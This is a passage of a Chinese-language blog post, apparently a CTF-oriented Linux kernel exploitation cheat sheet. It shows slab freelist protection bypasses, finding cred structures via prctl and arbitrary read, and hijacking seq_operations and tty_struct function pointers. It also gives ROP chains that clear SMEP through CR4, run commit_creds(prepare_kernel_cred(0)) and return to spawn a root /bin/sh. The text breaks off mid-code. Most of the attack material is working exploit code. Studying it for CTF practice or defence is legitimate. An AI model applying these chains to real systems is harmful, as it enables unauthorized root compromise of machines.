+<p>所以同理可得，也可以说如下，在中间加入一个chunk的free即可绕过</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">free chunk1</span><br><span class="line">free chunk2</span><br><span class="line">free chunk1</span><br></pre></td></tr></table></div></figure>
+
+<p>但是在内核环境下，啥时候都可能碰到申请chunk，所以有时候可能再申请的时候不能成功申请到chunk1-&gt;chunk2-&gt;chunk1的顺序</p>
+<p>这时候如果最好还是绑定到一个CPU上</p>
+<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 绑定到一个cpu上</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> cpu_mask = <span class="number">0x01</span>;</span><br><span class="line">sched_setaffinity(<span class="number">0</span>, <span class="number">1</span>, &amp;cpu_mask);</span><br></pre></td></tr></table></div></figure>
+
+
+
+
+        <h4 id="3-RANDOM保护"   >
+          <a href="#3-RANDOM保护" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-RANDOM保护" class="headerlink" title="(3)RANDOM保护"></a>(3)RANDOM保护</h4>
+      <p>在v4.7及之后存在，编译内核时加入<code>CONFIG_SLAB_FREELIST_RANDOM=y</code>选项</p>
+<p>这个情况下每次更新freelist的时候，会打乱freelist中空闲的chunk，造成无法简单申请到指定的chunk，不过我们可以修改FD之后，多次申请，也可以申请到修改之后的chunk。</p>
+<p>也是参考<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://rtfingc.github.io/slub-freelist-hardened" >Slub Freelist Hardened (rtfingc.github.io)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+
+        <h3 id="借助prctl函数寻找cred地址"   >
+          <a href="#借助prctl函数寻找cred地址" class="heading-link"><i class="fas fa-link"></i></a><a href="#借助prctl函数寻找cred地址" class="headerlink" title="借助prctl函数寻找cred地址"></a>借助prctl函数寻找cred地址</h3>
+      <p>🔺注：需要存在任意读</p>
+<p>prctl函数的PR_SET_NAME功能可以设置task_struct结构体中的comm[TASK_COMM_LEN]成员。</p>
+<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> target[<span class="number">16</span>];</span><br><span class="line"><span class="built_in">strcpy</span>(target,<span class="string">&quot;tryToFindPIG007&quot;</span>);</span><br><span class="line">prctl(PR_SET_NAME,target);</span><br></pre></td></tr></table></div></figure>
+
+<p>然后内存搜索定位</p>
+<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//search target chr</span></span><br><span class="line"><span class="keyword">char</span> *buf = (<span class="keyword">char</span> *)<span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">0x1000</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;[+] we can read and write any memory&quot;</span>);</span><br><span class="line"><span class="keyword">for</span>(;addr&lt;<span class="number">0xffffc80000000000</span>;addr+=<span class="number">0x1000</span>)&#123;</span><br><span class="line">    arbitrary_read(devFD,<span class="number">0x1000</span>,buf,addr);</span><br><span class="line">    result=memmem(buf,<span class="number">0x1000</span>,target,<span class="number">16</span>);</span><br><span class="line">    <span class="keyword">if</span> (result)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;result:%p\n&quot;</span>,result);</span><br><span class="line">        cred= * (<span class="keyword">size_t</span> *)(result<span class="number">-0x8</span>);</span><br><span class="line">        real_cred= *(<span class="keyword">size_t</span> *)(result<span class="number">-0x10</span>);</span><br><span class="line">        <span class="keyword">if</span> ((cred||<span class="number">0xff00000000000000</span>) &amp;&amp; (real_cred == cred))</span><br><span class="line">        &#123;</span><br><span class="line">            target_addr=addr+result-(<span class="keyword">int</span>)(buf);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+]found task_struct 0x%lx\n&quot;</span>,target_addr);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+]found cred 0x%lx\n&quot;</span>,real_cred);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
+
+<p>之后再借用任意写或者修改FD申请来修改cred结构中的内容即可。</p>
+
+        <h3 id="借助stat设备修改函数指针"   >
+          <a href="#借助stat设备修改函数指针" class="heading-link"><i class="fas fa-link"></i></a><a href="#借助stat设备修改函数指针" class="headerlink" title="借助stat设备修改函数指针"></a>借助stat设备修改函数指针</h3>
+      <p>原理就是劫持seq_operations结构体的函数指针，进而控制程序流。</p>
+<p>西湖论剑–easy_kernel</p>
+<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/260055#h3-5" >西湖论剑2021线上初赛easykernel题解 - 安全客，安全资讯平台 (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p>有如下结构体，大小为0x20，当我们可以申请0x20大小的Chunk，然后释放，再打开<code>/proc/self/stat</code>设备就可以得到该结构体。</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">struct seq_operations &#123;</span><br><span class="line">    void * (*start) (struct seq_file *m, loff_t *pos);</span><br><span class="line">    void (*stop) (struct seq_file *m, void *v);</span><br><span class="line">    void * (*next) (struct seq_file *m, void *v, loff_t *pos);</span><br><span class="line">    int (*show) (struct seq_file *m, void *v);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>
+
+<p>如果存在UAF之类的就可以从里面读取函数偏移，获得kernel基地址，然后还可以修改里面的start函数指针，劫持使其指向我们的gadget，当我们对该设备进行读取操作时，就会调用该start指针，从而进入到我们劫持的gadget，进而可以程序控制执行流。使用如下汇编进行对该设备的操作。</p>
+<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;xor rax, rax;&quot;</span></span><br><span class="line"><span class="string">&quot;mov rcx, 0x666666;&quot;</span></span><br><span class="line"><span class="string">&quot;mov rdx, 8;&quot;</span></span><br><span class="line"><span class="string">&quot;mov rsi, rsp;&quot;</span></span><br><span class="line"><span class="string">&quot;mov rdi, seq_fd;&quot;</span></span><br><span class="line"><span class="string">&quot;syscall&quot;</span></span><br></pre></td></tr></table></div></figure>
+
+<p>劫持之后再需要getshell就需要注意另一个结构体了</p>
+<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pt_regs</span> &#123;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * C ABI says these regs are callee-preserved. They aren&#x27;t saved on kernel entry</span></span><br><span class="line"><span class="comment"> * unless syscall needs a complete, fully filled &quot;struct pt_regs&quot;.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r15;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r14;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r13;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r12;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rbp;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rbx;</span><br><span class="line"><span class="comment">/* These regs are callee-clobbered. Always saved on kernel entry. */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r11;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r10;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r9;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r8;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rax;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rcx;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rdx;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rsi;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rdi;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * On syscall entry, this is syscall#. On CPU exception, this is error code.</span></span><br><span class="line"><span class="comment"> * On hw interrupt, it&#x27;s IRQ number:</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> orig_rax;</span><br><span class="line"><span class="comment">/* Return frame for iretq */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rip;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> cs;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> eflags;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rsp;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> ss;</span><br><span class="line"><span class="comment">/* top of stack page */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>
+
+<p>当我们调用syscall的时候，会将以上寄存器压入内核栈中，然后形成如上的结构，即如下汇编所示</p>
+<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">__asm__(</span><br><span class="line">    <span class="string">&quot;mov r15, 0xbeefdead;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r14, pop_rdi_ret;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r13, init_cred;&quot;</span> <span class="comment">// add rsp, 0x40 ; ret</span></span><br><span class="line">    <span class="string">&quot;mov r12, commit_creds;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rbp, swapgs_restore_regs_and_return_to_usermode;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rbx, 0x1111;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r11, 0x1111;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r10, 0x400db8;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r9, user_cs;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r8, user_rflags;&quot;</span></span><br><span class="line">    <span class="string">&quot;xor rax, rax;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rcx, user_sp;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rdx, user_ss;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rsi, rsp;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rdi, seq_fd;&quot;</span></span><br><span class="line">    <span class="string">&quot;syscall&quot;</span></span><br><span class="line">);</span><br></pre></td></tr></table></div></figure>
+
+<p>如上的汇编会在内核栈中形成如下</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201151105563.png" alt="image-20220115110535050"></p>
+<p>所以如果借助<code>add_rsp xx;pop_ret</code>这类指令，就可以将我们的控制流的栈拉高到我们可控数据范围，进而劫持栈。使用<code>commit(cred)</code>提权（这里的提权因为无法控制rdi，所以就借助<code>init_cred</code>来提权）。提权之后借助<code>swapgs_restore_regs_and_return_to_usermode</code>函数中的pop系列来调整栈，即借用了几个栈的位置，就得少几个pop，如图借用了5个栈数据，那么我们最后就得使得该函数少pop5个，即将swapgs_restore_regs_and_return_to_usermode函数的gadget+=9即可</p>
+<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">swapgs_restore_regs_and_return_to_usermode += <span class="number">9</span>;</span><br></pre></td></tr></table></div></figure>
+
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201151130591.png" alt="image-20220115113005162"></p>
+<p>如上修改之后就可以当进入到该函数的swapgs的时候，将栈调整至最开始因为syscall而形成的保存pt_regs结构体中的用户态数据的地方，使得提权之后成功返回用户态</p>
+<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pt_regs</span> &#123;</span></span><br><span class="line"><span class="comment">//.....................</span></span><br><span class="line"><span class="comment">/* Return frame for iretq */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rip;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> cs;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> eflags;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rsp;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> ss;</span><br><span class="line"><span class="comment">/* top of stack page */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>
+
+<p>所示栈如下</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201151136862.png" alt="image-20220115113622350"></p>
+<p>使用此种方法时一般可以先设置一些标志性数据，“AAAAAA”在栈上，然后搜寻即可，以此来寻找调栈所用的gadget。</p>
+<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">__asm__(</span><br><span class="line">    <span class="string">&quot;mov r15, 0xbeefdead;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r14, pop_rdi_ret;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r13, init_cred;&quot;</span> <span class="comment">// add rsp, 0x40 ; ret</span></span><br><span class="line">    <span class="string">&quot;mov r12, commit_creds;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rbp, swapgs_restore_regs_and_return_to_usermode;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rbx, 0x6565656565;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r11, 0x1111;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r10, 0x1111;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r9, 0x1111;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r8, 0x1111;&quot;</span></span><br><span class="line">    <span class="string">&quot;xor rax, rax;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rcx, 0x1111;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rdx, 8;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rsi, rsp;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rdi, seq_fd;&quot;</span></span><br><span class="line">    <span class="string">&quot;syscall&quot;</span></span><br><span class="line">);</span><br></pre></td></tr></table></div></figure>
+
+<p>然后在某个地址范围进行搜索，就能找到该结构体的位置，好像只能是peda比较好用</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find &quot;AAAAAA&quot; 0xffffc900001d3f80 0xffffc900001d3f98</span><br></pre></td></tr></table></div></figure>
+
+
+        <h3 id="借助ptmx设备-tty-struct"   >
+          <a href="#借助ptmx设备-tty-struct" class="heading-link"><i class="fas fa-link"></i></a><a href="#借助ptmx设备-tty-struct" class="headerlink" title="借助ptmx设备(tty_struct)"></a>借助ptmx设备(tty_struct)</h3>
+      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">entry_SYSCALL_64`-&gt;`SyS_write`-&gt;`SYSC_write`-&gt;`vfs_write`</span><br><span class="line">-&gt;`__vfs_write`-&gt;`tty_write`-&gt;`do_tty_write`-&gt;`n_tty_write`-&gt;`pty_write`</span><br></pre></td></tr></table></div></figure>
+
+<p>原理就是劫持tty_struct结构体中的const struct tty_operations *ops结构体指针，然后再修改fake_tty_operations结构体中的pty_write函数指针，通过对该设备进行写操作进而调用劫持的函数指针，控制执行流程。</p>
+<p>同时在调用的时候rax为从劫持的tty_struct结构体中获取的operations <em>ops指针</em>，该指针可以被我们修改劫持。之后借助一个对rax和rsp进行操作的gadget–movRspRax_decEbx_ret进而劫持栈，完成程序流和栈的劫持。</p>
+<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* function to get root id */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getroot</span> <span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  commit_creds(prepare_kernel_cred(<span class="number">0</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">shell</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[+] getuid() ...&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span>(!getuid()) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot; [root]\n[+] Enjoy your shell...\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] not root\n[+] failed !!!\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> getR = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)getroot;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> sh = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)shell;</span><br><span class="line"><span class="keyword">size_t</span> rop[<span class="number">32</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span>* fake_tty_operations[<span class="number">30</span>];</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">30</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">fake_tty_operations[i] = movRspRax_decEbx_ret;</span><br><span class="line">&#125;</span><br><span class="line">fake_tty_operations[<span class="number">0</span>] = pop_rax_rbx_r12_r13_rbp_ret;</span><br><span class="line">fake_tty_operations[<span class="number">1</span>] = (<span class="keyword">size_t</span>)rop;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> fake_tty_struct[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">fake_tty_struct[<span class="number">0</span>] = <span class="number">0x0000000100005401</span>;<span class="comment">//need to set magic number</span></span><br><span class="line">fake_tty_struct[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">fake_tty_struct[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">fake_tty_struct[<span class="number">3</span>] = (<span class="keyword">size_t</span>)fake_tty_operations;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">rop[i++] = pop_rdi_ret;      <span class="comment">// pop_rax_rbx_r12_rbp_ret</span></span><br><span class="line">rop[i++] = <span class="number">0x6f0</span>;</span><br><span class="line">rop[i++] = movCr4Rdi_pop_rbp_ret;      <span class="comment">// mov cr4, rax; pop rbp; ret;</span></span><br><span class="line">rop[i++] = <span class="number">0</span>;</span><br><span class="line">rop[i++] = (<span class="keyword">size_t</span>)getR;</span><br><span class="line">rop[i++] = swapgs_popRbp_ret;      <span class="comment">// swapgs;ret</span></span><br><span class="line">rop[i++] = <span class="number">0x0</span>;</span><br><span class="line">rop[i++] = iretq;      <span class="comment">// iretq</span></span><br><span class="line">rop[i++] = (<span class="keyword">size_t</span>)sh;</span><br><span class="line">rop[i++] = user_cs;                <span class="comment">/* saved CS */</span></span><br><span class="line">rop[i++] = user_rflags;            <span class="comment">/* saved EFLAGS */</span></span><br><span class="line">rop[i++] = user_sp;</span><br><span class="line">rop[i++] = user_ss;</span><br></pre></td></tr></table></div></figure>
+
+
+
+
+        <h2 id="2-栈"   >
+          <a href="#2-栈" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-栈" class="headerlink" title="2.栈"></a>2.栈</h2>
+      
+        <h3 id="1-commit-creds-prepare-kernel-cred-0"   >
+          <a href="#1-commit-creds-prepare-kernel-cred-0" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-commit-creds-prepare-kernel-cred-0" class="headerlink" title="(1)commit_creds(prepare_kernel_cred(0));"></a>(1)commit_creds(prepare_kernel_cred(0));</h3>
+      <p>这个算是比较常规的栈溢出，不过还需要注意SMEP/SMAP以及KPTI是否开启</p>
+
+        <h4 id="①开启SMEP情况"   >
+          <a href="#①开启SMEP情况" class="heading-link"><i class="fas fa-link"></i></a><a href="#①开启SMEP情况" class="headerlink" title="①开启SMEP情况"></a>①开启SMEP情况</h4>
+      <p>这种情况一般直接溢出然后关闭，或者知道基地址之后可以尝试在内核完成提权然后返回用户态</p>
+
+        <h5 id="ROP关闭SMEP保护，执行用户态提权代码"   >
+          <a href="#ROP关闭SMEP保护，执行用户态提权代码" class="heading-link"><i class="fas fa-link"></i></a><a href="#ROP关闭SMEP保护，执行用户态提权代码" class="headerlink" title="ROP关闭SMEP保护，执行用户态提权代码"></a>ROP关闭SMEP保护，执行用户态提权代码</h5>
+      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* function to get root id */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getroot</span> <span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  commit_creds(prepare_kernel_cred(<span class="number">0</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">shell</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[+] getuid() ...&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span>(!getuid()) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot; [root]\n[+] Enjoy your shell...\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] not root\n[+] failed !!!\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> getR = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)getroot;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> sh = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)shell;</span><br><span class="line"><span class="keyword">size_t</span> rop[<span class="number">32</span>];</span><br><span class="line"></span><br><span class="line">rop[i++] = pop_rdi_ret;      <span class="comment">// </span></span><br><span class="line">rop[i++] = <span class="number">0x6f0</span>;</span><br><span class="line">rop[i++] = movCr4Rdi_pop_rbp_ret;  <span class="comment">// mov cr4, rax; pop rbp; ret;</span></span><br><span class="line">rop[i++] = <span class="number">0</span>;</span><br><span class="line">rop[i++] = (<span class="keyword">size_t</span>)getR;</span><br><span class="line">rop[i++] = swapgs_popRbp_ret; </span><br><span class="line">rop[i++] = <span class="number">0x0</span>;</span><br><span class="line">rop[i++] = iretq;      			<span class="comment">// iretq</span></span><br><span class="line">rop[i++] = (<span class="keyword">size_t</span>)sh;</span><br><span class="line">rop[i++] = user_cs;                <span class="comment">/* saved CS */</span></span><br><span class="line">rop[i++] = user_rflags;            <span class="comment">/* saved EFLAGS */</span></span><br><span class="line">rop[i++] = user_sp;</span><br><span class="line">rop[i++] = user_ss;</span><br></pre></td></tr></table></div></figure>
+
+
+        <h5 id="ROP在内核态提权后返回用户态起Shell"   >
+          <a href="#ROP在内核态提权后返回用户态起Shell" class="heading-link"><i class="fas fa-link"></i></a><a href="#ROP在内核态提权后返回用户态起Shell" class="headerlink" title="ROP在内核态提权后返回用户态起Shell"></a>ROP在内核态提权后返回用户态起Shell</h5>
+      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">shell</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[+] getuid() ...&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span>(!getuid()) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot; [root]\n[+] Enjoy your shell...\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span 